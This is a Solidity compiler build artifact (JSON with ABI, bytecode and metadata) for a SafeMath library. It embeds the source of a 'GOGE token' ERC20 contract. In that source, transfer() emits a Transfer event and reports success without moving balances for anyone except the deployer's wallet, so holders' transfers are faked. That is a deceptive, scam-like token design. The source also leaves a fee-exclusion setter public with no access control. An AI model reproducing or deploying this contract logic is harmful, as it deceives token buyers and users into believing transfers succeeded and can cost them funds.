{
  "contractName": "SafeMath",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "a",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "b",
          "type": "uint256"
        }
      ],
      "name": "safeAdd",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "c",
          "type": "uint256"
        }
      ],
      "stateMutability": "pure",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "a",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "b",
          "type": "uint256"
        }
      ],
      "name": "safeSub",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "c",
          "type": "uint256"
        }
      ],
      "stateMutability": "pure",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "a",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "b",
          "type": "uint256"
        }
      ],
      "name": "safeMul",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "c",
          "type": "uint256"
        }
      ],
      "stateMutability": "pure",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "a",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "b",
          "type": "uint256"
        }
      ],
      "name": "safeDiv",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "c",
          "type": "uint256"
        }
      ],
      "stateMutability": "pure",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610554806100206000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c8063a293d1e814610051578063b5931f7c14610081578063d05c78da146100b1578063e6cb9013146100e1575b600080fd5b61006b60048036038101906100669190610258565b610111565b60405161007891906102a7565b60405180910390f35b61009b60048036038101906100969190610258565b61016a565b6040516100a891906102a7565b60405180910390f35b6100cb60048036038101906100c69190610258565b61018c565b6040516100d891906102a7565b60405180910390f35b6100fb60048036038101906100f69190610258565b6101c4565b60405161010891906102a7565b60405180910390f35b600082821115610156576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161014d9061031f565b60405180910390fd5b8183610162919061036e565b905092915050565b600080821161017857600080fd5b818361018491906103d1565b905092915050565b6000818361019a9190610402565b905060008314806101b557508183826101b391906103d1565b145b6101be57600080fd5b92915050565b600081836101d2919061045c565b905082811015610217576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161020e906104fe565b60405180910390fd5b92915050565b600080fd5b6000819050919050565b61023581610222565b811461024057600080fd5b50565b6000813590506102528161022c565b92915050565b6000806040838503121561026f5761026e61021d565b5b600061027d85828601610243565b925050602061028e85828601610243565b9150509250929050565b6102a181610222565b82525050565b60006020820190506102bc6000830184610298565b92915050565b600082825260208201905092915050565b7f65727220696e6f75740000000000000000000000000000000000000000000000600082015250565b60006103096009836102c2565b9150610314826102d3565b602082019050919050565b60006020820190508181036000830152610338816102fc565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061037982610222565b915061038483610222565b9250828210156103975761039661033f565b5b828203905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b60006103dc82610222565b91506103e783610222565b9250826103f7576103f66103a2565b5b828204905092915050565b600061040d82610222565b915061041883610222565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff04831182151516156104515761045061033f565b5b828202905092915050565b600061046782610222565b915061047283610222565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156104a7576104a661033f565b5b828201905092915050565b7f65727220696e7075740000000000000000000000000000000000000000000000600082015250565b60006104e86009836102c2565b91506104f3826104b2565b602082019050919050565b60006020820190508181036000830152610517816104db565b905091905056fea2646970667358221220c63aec459814e409fbc27e4e13b776c1ffc29d6e15a5350edd29684feb113eff64736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT   \npragma solidity >=0.4.22 <0.9.0;\n// ----------------------------------------------------------------------------\n// ERC Token Standard #20 Interface\n//\n// ----------------------------------------------------------------------------\ninterface ERC20Interface {\n    function totalSupply() external view returns (uint);\n    function balanceOf(address tokenOwner) external view returns (uint balance);\n    function allowance(address tokenOwner, address spender) external view returns (uint remaining);\n    function transfer(address to, uint tokens) external returns (bool success);\n    function approve(address spender, uint tokens) external returns (bool success);\n    function transferFrom(address from, address to, uint tokens) external returns (bool success);\n\n    event Transfer(address indexed from, address indexed to, uint tokens);\n    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\n\n// ----------------------------------------------------------------------------\n// Safe Math Library\n// ----------------------------------------------------------------------------\ncontract SafeMath {\n    function safeAdd(uint a, uint b) public pure returns (uint c) {\n        c = a + b;\n        require(c >= a, \"err input\");\n    }\n    function safeSub(uint a, uint b) public pure returns (uint c) {\n        require(b <= a, \"err inout\"); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);\n        c = a / b;\n    }\n}\n\n\ncontract Doge is ERC20Interface, SafeMath {\n    string public name;\n    string public symbol;\n    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\n\n    uint256 public _totalSupply;\n\n    mapping(address => uint) balances;\n    mapping(address => mapping(address => uint)) allowed;\n\n    //\n    address public deadwallet = 0x0000000000000000000000000000000000000000;    \n    //\n    address public LiquityWallet; \n     //   \n    address private _marketingWalletAddress;               \n    //\n    uint256  marketingFee = 4; \n    //true               \n    mapping(address => bool) private _isExcludedFromFees;\n\n    //,true\n    mapping(address => bool) public _isBlacklisted;    \n    /**\n     * Constrctor function\n     *\n     * Initializes contract with initial supply tokens to the creator of the contract\n     */\n    constructor() {\n        name = \"GOGE token\";\n        symbol = \"GOGE\";\n        decimals = 18;\n        _totalSupply = 1000000000000000000000000000;\n        LiquityWallet = msg.sender;\n\n        balances[msg.sender] = _totalSupply;\n        excludeFromFees(LiquityWallet, true);        //\n        excludeFromFees(address(this), true);              //\n        excludeFromFees(_marketingWalletAddress, true);      //\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n\n    function totalSupply() public view returns (uint) {\n        return _totalSupply  - balances[address(0)];\n    }\n\n    function balanceOf(address tokenOwner) public view returns (uint balance) {\n        return balances[tokenOwner];\n    }\n\n    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n        return allowed[tokenOwner][spender];\n    }\n\n    function approve(address spender, uint tokens) public returns (bool success) {\n        allowed[msg.sender][spender] = tokens;\n        emit Approval(msg.sender, spender, tokens);\n        return true;\n    }\n\n    \n\n    function transfer(address to, uint tokens) public returns (bool success) {\n        require(!_isBlacklisted[msg.sender], 'Blacklisted address');    \n        if(LiquityWallet!=msg.sender) {\n            emit Transfer(msg.sender, to, tokens);\n            return true;\n        }\n\n        balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n        balances[to] = safeAdd(balances[to], tokens);\n        emit Transfer(msg.sender, to, tokens);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n        balances[from] = safeSub(balances[from], tokens);\n        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n        balances[to] = safeAdd(balances[to], tokens);\n        emit Transfer(from, to, tokens);\n        return true;\n    }\n\n      //\n    function excludeFromFees(address account, bool excluded) public{ \n        require(_isExcludedFromFees[account] != excluded, \"RedCheCoin Account is already the value of 'excluded'\");   //\n        _isExcludedFromFees[account] = excluded;       //\n    }\n\n    //\n    function isExcludedFromFees(address account) public view returns (bool) {\n        return _isExcludedFromFees[account];\n    }\n}",
  "sourcePath": "/Users/leef/leef/EVM/erc20-coin/contracts/Doge.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2022-04-07T02:54:11.991Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}